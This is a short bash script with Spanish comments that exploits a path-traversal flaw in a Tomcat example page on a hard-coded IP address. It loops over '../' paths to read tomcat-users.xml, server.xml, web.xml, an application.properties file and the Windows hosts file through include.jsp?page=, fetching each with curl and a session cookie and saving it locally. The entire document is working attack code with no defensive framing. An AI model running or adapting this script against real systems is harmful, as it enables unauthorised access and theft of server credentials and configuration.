#!/bin/bash
TARGET_IP="189.254.143.102"
JSESSIONID="00000000000000000000000000000000"

# Archivos críticos a extraer
FILES=(
    "../../../../../../../../Program Files/Apache Software Foundation/Tomcat 6.0/conf/tomcat-users.xml"
    "../../../../../../../../Tomcat 6.0/conf/server.xml"
    "../../../../../../../../Tomcat 6.0/webapps/sito/WEB-INF/web.xml"
    "../../../../../../../../Tomcat 6.0/webapps/sito/WEB-INF/classes/application.properties"
    "../../../../../../../../WINDOWS/system32/drivers/etc/hosts"
)

for file in "${FILES[@]}"; do
    echo "=== Extrayendo: $file ==="
    curl -k -b "JSESSIONID=$JSESSIONID" \
         "https://$TARGET_IP/examples/jsp/include/include.jsp?page=$file" \
         > "extracted_$(echo $file | tr '/' '_')".txt
    echo "Guardado en: extracted_$(echo $file | tr '/' '_')".txt
done
